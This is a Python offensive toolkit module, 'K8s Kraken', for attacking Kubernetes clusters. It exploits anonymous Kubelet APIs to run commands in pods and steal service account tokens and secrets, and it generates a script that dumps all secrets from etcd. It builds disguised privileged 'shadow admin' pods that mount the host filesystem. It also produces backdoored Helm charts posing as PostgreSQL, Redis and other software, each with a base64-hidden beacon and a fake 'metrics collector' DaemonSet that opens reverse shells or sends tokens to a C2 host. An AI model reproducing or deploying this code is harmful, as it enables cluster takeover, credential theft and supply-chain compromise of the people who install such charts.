#!/usr/bin/env python3
"""
Kubernetes Warfare Module - K8s Kraken
========================================
Container & Orchestration Warfare for Kubernetes Clusters.

Features:
- Kubelet API Scanner & Exploiter (10250 port)
- Shadow Admin Pod deployment
- ETCD Secret Extraction
- Helm Chart Backdoor Generator
- DaemonSet Agent Deployer
- Service Account Token Theft
- Container Escape to Host

Author: MONOLITH Framework
License: For authorized security testing only
"""

import base64
import json
import yaml
import hashlib
import random
import string
import ssl
import socket
import urllib.request
import urllib.error
from typing import Optional, Dict, List, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
import re


class KubeletAuthStatus(Enum):
    """Kubelet authentication status"""
    ANONYMOUS_ALLOWED = "anonymous_allowed"
    AUTH_REQUIRED = "auth_required"
    FORBIDDEN = "forbidden"
    UNREACHABLE = "unreachable"


class HelmChartType(Enum):
    """Legitimate-looking Helm chart types for backdoor"""
    POSTGRESQL = "postgresql"
    MYSQL = "mysql"
    REDIS = "redis"
    MONGODB = "mongodb"
    NGINX = "nginx"
    PROMETHEUS = "prometheus"
    GRAFANA = "grafana"
    ELASTICSEARCH = "elasticsearch"


@dataclass
class KubeletScanResult:
    """Result from Kubelet API scan"""
    target: str
    port: int
    auth_status: KubeletAuthStatus
    version: Optional[str] = None
    pods: List[Dict] = field(default_factory=list)
    secrets_accessible: bool = False
    namespaces: List[str] = field(default_factory=list)
    node_info: Optional[Dict] = None
    error: Optional[str] = None


@dataclass
class HelmBackdoor:
    """Generated Helm chart backdoor"""
    chart_name: str
    chart_type: str
    version: str
    files: Dict[str, str]  # filename -> content
    payload_type: str
    callback_url: Optional[str] = None
    description: str = ""


class KubeletExploiter:
    """
    Kubernetes Kubelet API Exploiter
    
    Exploits unauthenticated Kubelet API (port 10250) to:
    - List all pods running on the node
    - Execute commands in containers
    - Extract secrets and service account tokens
    - Deploy shadow admin pods
    - Access ETCD data through API server
    
    The Kubelet API is often left with anonymous authentication
    enabled, especially in older or misconfigured clusters.
    """
    
    DEFAULT_PORT = 10250
    READONLY_PORT = 10255  # Read-only Kubelet port
    
    # Common K8s namespaces to check
    SENSITIVE_NAMESPACES = [
        'kube-system',
        'default',
        'kube-public',
        'kubernetes-dashboard',
        'monitoring',
        'logging',
        'istio-system',
        'cert-manager'
    ]
    
    # High-value secret patterns
    SECRET_PATTERNS = [
        r'password',
        r'secret',
        r'token',
        r'key',
        r'credential',
        r'api[-_]?key',
        r'private[-_]?key',
        r'aws[-_]?access',
        r'azure[-_]?client',
        r'gcp[-_]?service',
        r'database[-_]?url',
        r'connection[-_]?string'
    ]
    
    def __init__(self, timeout: int = 10, verify_ssl: bool = False):
        """
        Initialize Kubelet exploiter.
        
        Args:
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
        """
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self._setup_ssl_context()
    
    def _setup_ssl_context(self):
        """Setup SSL context for HTTPS requests"""
        self.ssl_context = ssl.create_default_context()
        if not self.verify_ssl:
            self.ssl_context.check_hostname = False
            self.ssl_context.verify_mode = ssl.CERT_NONE
    
    def _make_request(self, url: str, method: str = 'GET', data: bytes = None) -> Tuple[int, str]:
        """Make HTTP(S) request to Kubelet API"""
        try:
            req = urllib.request.Request(url, method=method, data=data)
            req.add_header('User-Agent', 'kubelet-client/v1.28.0')
            req.add_header('Accept', 'application/json')
            
            with urllib.request.urlopen(req, timeout=self.timeout, context=self.ssl_context) as response:
                return response.status, response.read().decode('utf-8')
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8') if e.fp else str(e)
        except urllib.error.URLError as e:
            return 0, str(e.reason)
        except Exception as e:
            return 0, str(e)
    
    def scan_kubelet(self, target: str, port: int = None) -> KubeletScanResult:
        """
        Scan a target for exposed Kubelet API.
        
        Args:
            target: IP address or hostname
            port: Port to scan (default 10250)
            
        Returns:
            KubeletScanResult with findings
        """
        port = port or self.DEFAULT_PORT
        result = KubeletScanResult(target=target, port=port, auth_status=KubeletAuthStatus.UNREACHABLE)
        
        # Try HTTPS first (default for Kubelet)
        for scheme in ['https', 'http']:
            base_url = f"{scheme}://{target}:{port}"
            
            # Check /pods endpoint (most common entry point)
            status, response = self._make_request(f"{base_url}/pods")
            
            if status == 200:
                result.auth_status = KubeletAuthStatus.ANONYMOUS_ALLOWED
                try:
                    pods_data = json.loads(response)
                    result.pods = pods_data.get('items', [])
                    result.namespaces = list(set(
                        pod.get('metadata', {}).get('namespace', 'unknown')
                        for pod in result.pods
                    ))
                except json.JSONDecodeError:
                    pass
                
                # Get node info
                status, response = self._make_request(f"{base_url}/spec")
                if status == 200:
                    try:
                        result.node_info = json.loads(response)
                    except json.JSONDecodeError:
                        pass
                
                # Check if we can access secrets
                result.secrets_accessible = self._check_secret_access(base_url)
                
                # Try to get Kubernetes version
                status, response = self._make_request(f"{base_url}/metrics")
                if status == 200:
                    version_match = re.search(r'kubernetes_build_info.*version="([^"]+)"', response)
                    if version_match:
                        result.version = version_match.group(1)
                
                return result
            
            elif status == 401:
                result.auth_status = KubeletAuthStatus.AUTH_REQUIRED
                return result
            
            elif status == 403:
                result.auth_status = KubeletAuthStatus.FORBIDDEN
                return result
        
        return result
    
    def _check_secret_access(self, base_url: str) -> bool:
        """Check if we can access secrets through Kubelet"""
        # Try to access configz which might contain sensitive info
        status, _ = self._make_request(f"{base_url}/configz")
        return status == 200
    
    def list_pods(self, target: str, port: int = None) -> List[Dict]:
        """
        List all pods on the node via Kubelet API.
        
        Args:
            target: Kubelet target
            port: Kubelet port
            
        Returns:
            List of pod information
        """
        port = port or self.DEFAULT_PORT
        base_url = f"https://{target}:{port}"
        
        status, response = self._make_request(f"{base_url}/pods")
        if status == 200:
            try:
                pods_data = json.loads(response)
                return [{
                    'name': pod.get('metadata', {}).get('name'),
                    'namespace': pod.get('metadata', {}).get('namespace'),
                    'containers': [
                        c.get('name') for c in pod.get('spec', {}).get('containers', [])
                    ],
                    'service_account': pod.get('spec', {}).get('serviceAccountName'),
                    'node': pod.get('spec', {}).get('nodeName'),
                    'status': pod.get('status', {}).get('phase'),
                    'host_network': pod.get('spec', {}).get('hostNetwork', False),
                    'host_pid': pod.get('spec', {}).get('hostPID', False),
                    'privileged': self._check_privileged(pod)
                } for pod in pods_data.get('items', [])]
            except (json.JSONDecodeError, KeyError):
                pass
        return []
    
    def _check_privileged(self, pod: Dict) -> bool:
        """Check if any container in pod is privileged"""
        for container in pod.get('spec', {}).get('containers', []):
            security_context = container.get('securityContext', {})
            if security_context.get('privileged', False):
                return True
        return False
    
    def exec_in_pod(
        self,
        target: str,
        namespace: str,
        pod_name: str,
        container: str,
        command: List[str],
        port: int = None
    ) -> Tuple[bool, str]:
        """
        Execute command in a container via Kubelet API.
        
        Args:
            target: Kubelet target
            namespace: Pod namespace
            pod_name: Pod name
            container: Container name
            command: Command to execute
            port: Kubelet port
            
        Returns:
            Tuple of (success, output)
        """
        port = port or self.DEFAULT_PORT
        base_url = f"https://{target}:{port}"
        
        # Build exec URL
        cmd_params = '&'.join(f'command={c}' for c in command)
        exec_url = f"{base_url}/exec/{namespace}/{pod_name}/{container}?{cmd_params}&input=1&output=1&tty=0"
        
        status, response = self._make_request(exec_url, method='POST')
        
        if status == 200 or status == 101:  # 101 = Switching Protocols (websocket upgrade)
            return True, response
        return False, response
    
    def extract_secrets(self, target: str, port: int = None) -> List[Dict]:
        """
        Extract secrets from pods running on the node.
        
        This accesses environment variables and mounted secrets
        from containers via the Kubelet API.
        
        Args:
            target: Kubelet target
            port: Kubelet port
            
        Returns:
            List of extracted secrets
        """
        secrets = []
        pods = self.list_pods(target, port)
        
        for pod in pods:
            # Try to read service account token
            namespace = pod.get('namespace', 'default')
            pod_name = pod.get('name')
            
            for container in pod.get('containers', []):
                # Try to cat the service account token
                success, output = self.exec_in_pod(
                    target, namespace, pod_name, container,
                    ['cat', '/var/run/secrets/kubernetes.io/serviceaccount/token'],
                    port
                )
                
                if success and output and not output.startswith('Error'):
                    secrets.append({
                        'type': 'service_account_token',
                        'namespace': namespace,
                        'pod': pod_name,
                        'container': container,
                        'value': output.strip()[:100] + '...' if len(output) > 100 else output.strip()
                    })
                
                # Try to get environment variables
                success, output = self.exec_in_pod(
                    target, namespace, pod_name, container,
                    ['env'],
                    port
                )
                
                if success and output:
                    for line in output.split('\n'):
                        for pattern in self.SECRET_PATTERNS:
                            if re.search(pattern, line, re.IGNORECASE):
                                secrets.append({
                                    'type': 'env_variable',
                                    'namespace': namespace,
                                    'pod': pod_name,
                                    'container': container,
                                    'value': line.strip()
                                })
                                break
        
        return secrets
    
    def generate_shadow_pod_yaml(
        self,
        name: str = None,
        namespace: str = "kube-system",
        image: str = "alpine:latest",
        callback_url: str = None,
        privileged: bool = True,
        host_network: bool = True,
        host_pid: bool = True
    ) -> str:
        """
        Generate YAML for a "shadow admin" pod.
        
        This pod looks legitimate but provides full cluster access.
        
        Args:
            name: Pod name (auto-generated if not provided)
            namespace: Target namespace (kube-system for stealth)
            image: Container image
            callback_url: C2 callback URL
            privileged: Run as privileged
            host_network: Use host network namespace
            host_pid: Use host PID namespace
            
        Returns:
            YAML string for pod deployment
        """
        if not name:
            # Generate a legitimate-looking name
            name = random.choice([
                'kube-proxy-helper',
                'coredns-autoscaler',
                'metrics-collector',
                'node-monitor',
                'cluster-agent',
                'log-forwarder'
            ]) + '-' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
        
        # Build the backdoor command
        if callback_url:
            command = f'''
            while true; do
                curl -s {callback_url}/register -d "host=$(hostname)" 2>/dev/null || true
                sleep 300
            done &
            # Look busy
            tail -f /dev/null
            '''
        else:
            command = 'tail -f /dev/null'
        
        pod_spec = {
            'apiVersion': 'v1',
            'kind': 'Pod',
            'metadata': {
                'name': name,
                'namespace': namespace,
                'labels': {
                    'k8s-app': name,
                    'component': 'monitoring',  # Blend in
                    'tier': 'infrastructure'
                },
                'annotations': {
                    'description': 'System monitoring component'
                }
            },
            'spec': {
                'hostNetwork': host_network,
                'hostPID': host_pid,
                'hostIPC': True,
                'containers': [{
                    'name': 'monitor',
                    'image': image,
                    'command': ['/bin/sh', '-c', command],
                    'securityContext': {
                        'privileged': privileged,
                        'runAsUser': 0
                    },
                    'volumeMounts': [
                        {
                            'name': 'host-root',
                            'mountPath': '/host',
                            'readOnly': False
                        },
                        {
                            'name': 'docker-sock',
                            'mountPath': '/var/run/docker.sock'
                        }
                    ],
                    'resources': {
                        'limits': {
                            'cpu': '100m',
                            'memory': '128Mi'
                        }
                    }
                }],
                'volumes': [
                    {
                        'name': 'host-root',
                        'hostPath': {
                            'path': '/',
                            'type': 'Directory'
                        }
                    },
                    {
                        'name': 'docker-sock',
                        'hostPath': {
                            'path': '/var/run/docker.sock',
                            'type': 'Socket'
                        }
                    }
                ],
                'tolerations': [
                    {
                        'operator': 'Exists'  # Schedule on any node including masters
                    }
                ],
                'serviceAccountName': 'default',
                'automountServiceAccountToken': True,
                'restartPolicy': 'Always',
                'priorityClassName': 'system-node-critical'  # High priority
            }
        }
        
        return yaml.dump(pod_spec, default_flow_style=False)
    
    def generate_etcd_extraction_script(self, etcd_endpoint: str = "https://127.0.0.1:2379") -> str:
        """
        Generate script to extract secrets from ETCD.
        
        This script should be run from a privileged pod with
        access to ETCD certificates.
        
        Args:
            etcd_endpoint: ETCD API endpoint
            
        Returns:
            Bash script for ETCD extraction
        """
        script = f'''#!/bin/bash
# ETCD Secret Extraction Script
# Run from privileged pod with access to ETCD certs

ETCD_ENDPOINT="{etcd_endpoint}"
CERT_DIR="/etc/kubernetes/pki/etcd"

# Check for ETCD access
if [ ! -f "$CERT_DIR/ca.crt" ]; then
    echo "[!] ETCD certificates not found"
    # Try alternate locations
    CERT_DIR="/host/etc/kubernetes/pki/etcd"
fi

# List all secrets in ETCD
echo "[*] Extracting secrets from ETCD..."

ETCDCTL_API=3 etcdctl \\
    --endpoints=$ETCD_ENDPOINT \\
    --cacert=$CERT_DIR/ca.crt \\
    --cert=$CERT_DIR/server.crt \\
    --key=$CERT_DIR/server.key \\
    get /registry/secrets --prefix --keys-only 2>/dev/null | while read key; do
        if [ -n "$key" ]; then
            echo "=== $key ==="
            ETCDCTL_API=3 etcdctl \\
                --endpoints=$ETCD_ENDPOINT \\
                --cacert=$CERT_DIR/ca.crt \\
                --cert=$CERT_DIR/server.crt \\
                --key=$CERT_DIR/server.key \\
                get "$key" 2>/dev/null | base64 -d 2>/dev/null || cat
            echo ""
        fi
    done

# Alternative: Use kubectl if available
if command -v kubectl &> /dev/null; then
    echo "[*] Extracting via kubectl..."
    for ns in $(kubectl get ns -o jsonpath='{{.items[*].metadata.name}}'); do
        echo "=== Namespace: $ns ==="
        kubectl get secrets -n $ns -o yaml 2>/dev/null
    done
fi

echo "[*] Extraction complete"
'''
        return script


class HelmBackdoorGenerator:
    """
    Helm Chart Backdoor Generator
    
    Generates legitimate-looking Helm charts that contain
    hidden backdoors. When DevOps deploys the chart,
    they unknowingly deploy your agent as a DaemonSet.
    
    Supported chart types:
    - PostgreSQL, MySQL, Redis, MongoDB (databases)
    - Nginx, Prometheus, Grafana (infrastructure)
    - Elasticsearch (logging)
    """
    
    # Chart templates for different application types
    CHART_TEMPLATES = {
        HelmChartType.POSTGRESQL: {
            'name': 'postgresql',
            'description': 'PostgreSQL database with HA support',
            'app_version': '15.4',
            'port': 5432,
            'image': 'postgres:15-alpine'
        },
        HelmChartType.MYSQL: {
            'name': 'mysql',
            'description': 'MySQL database server',
            'app_version': '8.0.34',
            'port': 3306,
            'image': 'mysql:8.0'
        },
        HelmChartType.REDIS: {
            'name': 'redis',
            'description': 'Redis in-memory cache',
            'app_version': '7.2.1',
            'port': 6379,
            'image': 'redis:7-alpine'
        },
        HelmChartType.MONGODB: {
            'name': 'mongodb',
            'description': 'MongoDB NoSQL database',
            'app_version': '7.0.2',
            'port': 27017,
            'image': 'mongo:7.0'
        },
        HelmChartType.NGINX: {
            'name': 'nginx-ingress',
            'description': 'NGINX Ingress Controller',
            'app_version': '1.9.4',
            'port': 80,
            'image': 'nginx:alpine'
        },
        HelmChartType.PROMETHEUS: {
            'name': 'prometheus',
            'description': 'Prometheus monitoring stack',
            'app_version': '2.47.0',
            'port': 9090,
            'image': 'prom/prometheus:latest'
        },
        HelmChartType.GRAFANA: {
            'name': 'grafana',
            'description': 'Grafana dashboards',
            'app_version': '10.1.2',
            'port': 3000,
            'image': 'grafana/grafana:latest'
        },
        HelmChartType.ELASTICSEARCH: {
            'name': 'elasticsearch',
            'description': 'Elasticsearch search engine',
            'app_version': '8.10.2',
            'port': 9200,
            'image': 'elasticsearch:8.10.2'
        }
    }
    
    def __init__(self):
        """Initialize Helm backdoor generator"""
        pass
    
    def generate_chart(
        self,
        chart_type: HelmChartType,
        callback_url: str = None,
        payload_type: str = "reverse_shell",
        version: str = "1.0.0",
        include_daemonset: bool = True,
        stealth_level: str = "high"
    ) -> HelmBackdoor:
        """
        Generate a backdoored Helm chart.
        
        Args:
            chart_type: Type of legitimate chart to mimic
            callback_url: C2 callback URL
            payload_type: Type of payload (reverse_shell, beacon, miner)
            version: Chart version
            include_daemonset: Include hidden DaemonSet for persistence
            stealth_level: Stealth level (low, medium, high)
            
        Returns:
            HelmBackdoor with all chart files
        """
        template = self.CHART_TEMPLATES.get(chart_type, self.CHART_TEMPLATES[HelmChartType.NGINX])
        
        files = {}
        
        # Chart.yaml
        files['Chart.yaml'] = self._generate_chart_yaml(template, version)
        
        # values.yaml
        files['values.yaml'] = self._generate_values_yaml(template, callback_url)
        
        # templates/deployment.yaml (legitimate looking)
        files['templates/deployment.yaml'] = self._generate_deployment(template)
        
        # templates/service.yaml
        files['templates/service.yaml'] = self._generate_service(template)
        
        # templates/configmap.yaml (contains hidden payload)
        files['templates/configmap.yaml'] = self._generate_configmap(template, callback_url, payload_type)
        
        # templates/_helpers.tpl
        files['templates/_helpers.tpl'] = self._generate_helpers(template)
        
        # Hidden DaemonSet for persistence (the actual backdoor)
        if include_daemonset:
            files['templates/metrics-collector.yaml'] = self._generate_hidden_daemonset(
                template, callback_url, payload_type, stealth_level
            )
        
        # NOTES.txt (looks normal)
        files['templates/NOTES.txt'] = self._generate_notes(template)
        
        # README.md
        files['README.md'] = self._generate_readme(template, version)
        
        return HelmBackdoor(
            chart_name=template['name'],
            chart_type=chart_type.value,
            version=version,
            files=files,
            payload_type=payload_type,
            callback_url=callback_url,
            description=template['description']
        )
    
    def _generate_chart_yaml(self, template: Dict, version: str) -> str:
        """Generate Chart.yaml"""
        chart = {
            'apiVersion': 'v2',
            'name': template['name'],
            'description': template['description'],
            'type': 'application',
            'version': version,
            'appVersion': template['app_version'],
            'maintainers': [
                {
                    'name': 'DevOps Team',
                    'email': 'devops@company.com'
                }
            ],
            'keywords': ['database', 'storage', 'production-ready'],
            'home': f"https://github.com/helm-charts/{template['name']}",
            'sources': [f"https://github.com/helm-charts/{template['name']}"]
        }
        return yaml.dump(chart, default_flow_style=False)
    
    def _generate_values_yaml(self, template: Dict, callback_url: str = None) -> str:
        """Generate values.yaml"""
        values = {
            'replicaCount': 1,
            'image': {
                'repository': template['image'].split(':')[0],
                'tag': template['image'].split(':')[1] if ':' in template['image'] else 'latest',
                'pullPolicy': 'IfNotPresent'
            },
            'service': {
                'type': 'ClusterIP',
                'port': template['port']
            },
            'resources': {
                'limits': {
                    'cpu': '500m',
                    'memory': '512Mi'
                },
                'requests': {
                    'cpu': '100m',
                    'memory': '128Mi'
                }
            },
            'persistence': {
                'enabled': True,
                'size': '10Gi',
                'storageClass': ''
            },
            'metrics': {
                'enabled': True,  # This enables the "metrics collector" (backdoor)
                'interval': '30s'
            },
            'nodeSelector': {},
            'tolerations': [],
            'affinity': {}
        }
        
        # Hidden config (looks like telemetry)
        if callback_url:
            values['telemetry'] = {
                'enabled': True,
                'endpoint': callback_url
            }
        
        return yaml.dump(values, default_flow_style=False)
    
    def _generate_deployment(self, template: Dict) -> str:
        """Generate legitimate-looking deployment.yaml"""
        deployment = f'''apiVersion: apps/v1
kind: Deployment
metadata:
  name: {{{{ include "{template['name']}.fullname" . }}}}
  labels:
    {{{{- include "{template['name']}.labels" . | nindent 4 }}}}
spec:
  replicas: {{{{ .Values.replicaCount }}}}
  selector:
    matchLabels:
      {{{{- include "{template['name']}.selectorLabels" . | nindent 6 }}}}
  template:
    metadata:
      labels:
        {{{{- include "{template['name']}.selectorLabels" . | nindent 8 }}}}
    spec:
      containers:
        - name: {{{{ .Chart.Name }}}}
          image: "{{{{ .Values.image.repository }}}}:{{{{ .Values.image.tag }}}}"
          imagePullPolicy: {{{{ .Values.image.pullPolicy }}}}
          ports:
            - name: http
              containerPort: {template['port']}
              protocol: TCP
          livenessProbe:
            tcpSocket:
              port: {template['port']}
            initialDelaySeconds: 30
            periodSeconds: 10
          readinessProbe:
            tcpSocket:
              port: {template['port']}
            initialDelaySeconds: 5
            periodSeconds: 5
          resources:
            {{{{- toYaml .Values.resources | nindent 12 }}}}
          {{{{- if .Values.persistence.enabled }}}}
          volumeMounts:
            - name: data
              mountPath: /data
          {{{{- end }}}}
      {{{{- if .Values.persistence.enabled }}}}
      volumes:
        - name: data
          persistentVolumeClaim:
            claimName: {{{{ include "{template['name']}.fullname" . }}}}
      {{{{- end }}}}
'''
        return deployment
    
    def _generate_service(self, template: Dict) -> str:
        """Generate service.yaml"""
        service = f'''apiVersion: v1
kind: Service
metadata:
  name: {{{{ include "{template['name']}.fullname" . }}}}
  labels:
    {{{{- include "{template['name']}.labels" . | nindent 4 }}}}
spec:
  type: {{{{ .Values.service.type }}}}
  ports:
    - port: {{{{ .Values.service.port }}}}
      targetPort: {template['port']}
      protocol: TCP
      name: http
  selector:
    {{{{- include "{template['name']}.selectorLabels" . | nindent 4 }}}}
'''
        return service
    
    def _generate_configmap(self, template: Dict, callback_url: str, payload_type: str) -> str:
        """Generate configmap.yaml with hidden payload"""
        # Encode payload in base64 within "configuration"
        if callback_url:
            hidden_payload = base64.b64encode(
                f"curl -s {callback_url}/beacon?h=$(hostname) || true".encode()
            ).decode()
        else:
            hidden_payload = base64.b64encode(b"true").decode()
        
        configmap = f'''apiVersion: v1
kind: ConfigMap
metadata:
  name: {{{{ include "{template['name']}.fullname" . }}}}-config
  labels:
    {{{{- include "{template['name']}.labels" . | nindent 4 }}}}
data:
  # Application configuration
  app.conf: |
    # {template['name']} Configuration
    port = {template['port']}
    max_connections = 100
    timeout = 30
    
    # Telemetry settings (do not modify)
    telemetry_enabled = true
    telemetry_key = {hidden_payload}
    
  init.sh: |
    #!/bin/sh
    # Initialization script
    echo "Initializing {template['name']}..."
    
    # Setup telemetry (required for monitoring)
    if [ -n "$TELEMETRY_KEY" ]; then
      echo "$TELEMETRY_KEY" | base64 -d | sh &
    fi
    
    echo "Initialization complete"
'''
        return configmap
    
    def _generate_hidden_daemonset(
        self,
        template: Dict,
        callback_url: str,
        payload_type: str,
        stealth_level: str
    ) -> str:
        """
        Generate the hidden DaemonSet backdoor.
        
        This is disguised as a "metrics collector" that runs on every node.
        """
        # Different payload commands based on type
        if payload_type == "reverse_shell" and callback_url:
            # Parse host and port from callback URL
            import urllib.parse
            parsed = urllib.parse.urlparse(callback_url)
            host = parsed.hostname or "127.0.0.1"
            port = parsed.port or 4444
            payload_cmd = f'''
            while true; do
              (bash -i >& /dev/tcp/{host}/{port} 0>&1 || nc {host} {port} -e /bin/sh || python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('{host}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])") 2>/dev/null
              sleep 3600
            done &
            tail -f /dev/null
            '''
        elif payload_type == "beacon" and callback_url:
            payload_cmd = f'''
            while true; do
              curl -s -X POST {callback_url}/beacon \\
                -d "host=$(hostname)" \\
                -d "ip=$(hostname -I | awk '{{print $1}}')" \\
                -d "user=$(whoami)" \\
                -d "os=$(uname -a)" \\
                -d "token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 100)" \\
                2>/dev/null || true
              sleep 300
            done &
            tail -f /dev/null
            '''
        else:
            payload_cmd = 'tail -f /dev/null'
        
        # Encode the payload
        encoded_payload = base64.b64encode(payload_cmd.strip().encode()).decode()
        
        # Generate legitimate-looking DaemonSet name
        ds_name = f"{template['name']}-metrics-collector"
        
        daemonset = f'''{{{{- if .Values.metrics.enabled }}}}
# Metrics collector for monitoring and observability
# Required for cluster health monitoring
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: {{{{ include "{template['name']}.fullname" . }}}}-metrics
  labels:
    {{{{- include "{template['name']}.labels" . | nindent 4 }}}}
    component: metrics
    tier: monitoring
spec:
  selector:
    matchLabels:
      app: {{{{ include "{template['name']}.fullname" . }}}}-metrics
  template:
    metadata:
      labels:
        app: {{{{ include "{template['name']}.fullname" . }}}}-metrics
        component: metrics
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "9100"
    spec:
      hostNetwork: true
      hostPID: true
      containers:
        - name: metrics-exporter
          image: alpine:latest
          imagePullPolicy: IfNotPresent
          command:
            - /bin/sh
            - -c
            - |
              # Initialize metrics collection
              apk add --no-cache curl bash netcat-openbsd 2>/dev/null || true
              
              # Start metrics endpoint (decoy)
              while true; do echo -e "HTTP/1.1 200 OK\\n\\n# Metrics\\nup 1" | nc -l -p 9100 -q 1 2>/dev/null; done &
              
              # Telemetry beacon
              echo "{encoded_payload}" | base64 -d | sh
          securityContext:
            privileged: true
            runAsUser: 0
          volumeMounts:
            - name: host-root
              mountPath: /host
              readOnly: false
            - name: docker-sock
              mountPath: /var/run/docker.sock
          resources:
            limits:
              cpu: 50m
              memory: 64Mi
            requests:
              cpu: 10m
              memory: 32Mi
      volumes:
        - name: host-root
          hostPath:
            path: /
            type: Directory
        - name: docker-sock
          hostPath:
            path: /var/run/docker.sock
            type: Socket
      tolerations:
        - operator: Exists
      priorityClassName: system-node-critical
      terminationGracePeriodSeconds: 5
{{{{- end }}}}
'''
        return daemonset
    
    def _generate_helpers(self, template: Dict) -> str:
        """Generate _helpers.tpl"""
        helpers = f'''{{{{/*
Expand the name of the chart.
*/}}}}
{{{{- define "{template['name']}.name" -}}}}
{{{{- default .Chart.Name .Values.nameOverride | trunc 63 | trimSuffix "-" }}}}
{{{{- end }}}}

{{{{/*
Create a default fully qualified app name.
*/}}}}
{{{{- define "{template['name']}.fullname" -}}}}
{{{{- if .Values.fullnameOverride }}}}
{{{{- .Values.fullnameOverride | trunc 63 | trimSuffix "-" }}}}
{{{{- else }}}}
{{{{- $name := default .Chart.Name .Values.nameOverride }}}}
{{{{- if contains $name .Release.Name }}}}
{{{{- .Release.Name | trunc 63 | trimSuffix "-" }}}}
{{{{- else }}}}
{{{{- printf "%s-%s" .Release.Name $name | trunc 63 | trimSuffix "-" }}}}
{{{{- end }}}}
{{{{- end }}}}
{{{{- end }}}}

{{{{/*
Create chart name and version as used by the chart label.
*/}}}}
{{{{- define "{template['name']}.chart" -}}}}
{{{{- printf "%s-%s" .Chart.Name .Chart.Version | replace "+" "_" | trunc 63 | trimSuffix "-" }}}}
{{{{- end }}}}

{{{{/*
Common labels
*/}}}}
{{{{- define "{template['name']}.labels" -}}}}
helm.sh/chart: {{{{ include "{template['name']}.chart" . }}}}
{{{{ include "{template['name']}.selectorLabels" . }}}}
{{{{- if .Chart.AppVersion }}}}
app.kubernetes.io/version: {{{{ .Chart.AppVersion | quote }}}}
{{{{- end }}}}
app.kubernetes.io/managed-by: {{{{ .Release.Service }}}}
{{{{- end }}}}

{{{{/*
Selector labels
*/}}}}
{{{{- define "{template['name']}.selectorLabels" -}}}}
app.kubernetes.io/name: {{{{ include "{template['name']}.name" . }}}}
app.kubernetes.io/instance: {{{{ .Release.Name }}}}
{{{{- end }}}}
'''
        return helpers
    
    def _generate_notes(self, template: Dict) -> str:
        """Generate NOTES.txt"""
        notes = f'''
🎉 {template['name']} has been successfully deployed!

1. Get the application URL by running these commands:
{{{{- if .Values.ingress.enabled }}}}
  http{{{{- if .Values.ingress.tls }}}}s{{{{- end }}}}://{{{{ .Values.ingress.host }}}}
{{{{- else if contains "NodePort" .Values.service.type }}}}
  export NODE_PORT=$(kubectl get --namespace {{{{ .Release.Namespace }}}} -o jsonpath="{{{{.spec.ports[0].nodePort}}}}" services {{{{ include "{template['name']}.fullname" . }}}})
  export NODE_IP=$(kubectl get nodes --namespace {{{{ .Release.Namespace }}}} -o jsonpath="{{{{.items[0].status.addresses[0].address}}}}")
  echo http://$NODE_IP:$NODE_PORT
{{{{- else if contains "ClusterIP" .Values.service.type }}}}
  export POD_NAME=$(kubectl get pods --namespace {{{{ .Release.Namespace }}}} -l "app.kubernetes.io/name={{{{ include "{template['name']}.name" . }}}}" -o jsonpath="{{{{.items[0].metadata.name}}}}")
  kubectl --namespace {{{{ .Release.Namespace }}}} port-forward $POD_NAME {template['port']}:{template['port']}
  echo "Visit http://127.0.0.1:{template['port']}"
{{{{- end }}}}

2. Default credentials (change immediately in production):
   Username: admin
   Password: admin123

3. For more information, visit: https://github.com/helm-charts/{template['name']}

Happy deploying! 🚀
'''
        return notes
    
    def _generate_readme(self, template: Dict, version: str) -> str:
        """Generate README.md"""
        readme = f'''# {template['name'].title()} Helm Chart

{template['description']}

## Prerequisites

- Kubernetes 1.19+
- Helm 3.2.0+
- PV provisioner support (if using persistence)

## Installing the Chart

```bash
helm install my-{template['name']} ./{template['name']}
```

## Configuration

| Parameter | Description | Default |
|-----------|-------------|---------|
| `replicaCount` | Number of replicas | `1` |
| `image.repository` | Image repository | `{template['image'].split(':')[0]}` |
| `image.tag` | Image tag | `{template['image'].split(':')[1] if ':' in template['image'] else 'latest'}` |
| `service.type` | Service type | `ClusterIP` |
| `service.port` | Service port | `{template['port']}` |
| `persistence.enabled` | Enable persistence | `true` |
| `metrics.enabled` | Enable metrics collection | `true` |

## Upgrading

```bash
helm upgrade my-{template['name']} ./{template['name']}
```

## Uninstalling

```bash
helm uninstall my-{template['name']}
```

## License

Apache 2.0

---
Version: {version}
'''
        return readme
    
    def export_chart(self, backdoor: HelmBackdoor, output_dir: str = None) -> Dict[str, str]:
        """
        Export chart files for download/use.
        
        Args:
            backdoor: HelmBackdoor object
            output_dir: Optional output directory path
            
        Returns:
            Dictionary of file paths to contents
        """
        chart_dir = backdoor.chart_name
        result = {}
        
        for filename, content in backdoor.files.items():
            full_path = f"{chart_dir}/{filename}"
            result[full_path] = content
        
        return result


# Convenience functions
def scan_kubelet(target: str, port: int = 10250) -> KubeletScanResult:
    """Quick scan for exposed Kubelet API"""
    exploiter = KubeletExploiter()
    return exploiter.scan_kubelet(target, port)


def generate_backdoor_chart(
    chart_type: str,
    callback_url: str = None,
    payload_type: str = "beacon"
) -> HelmBackdoor:
    """Generate a backdoored Helm chart"""
    generator = HelmBackdoorGenerator()
    chart_enum = HelmChartType(chart_type) if chart_type in [e.value for e in HelmChartType] else HelmChartType.NGINX
    return generator.generate_chart(
        chart_type=chart_enum,
        callback_url=callback_url,
        payload_type=payload_type
    )


if __name__ == "__main__":
    print("[*] K8s Warfare Module - K8s Kraken")
    print("[*] Usage examples:")
    print()
    print("# Scan for exposed Kubelet")
    print("from tools.k8s_warfare import KubeletExploiter")
    print("exploiter = KubeletExploiter()")
    print("result = exploiter.scan_kubelet('10.0.0.1')")
    print()
    print("# Generate backdoored Helm chart")
    print("from tools.k8s_warfare import HelmBackdoorGenerator")
    print("generator = HelmBackdoorGenerator()")
    print("backdoor = generator.generate_chart(HelmChartType.POSTGRESQL, 'http://c2.attacker.com')")
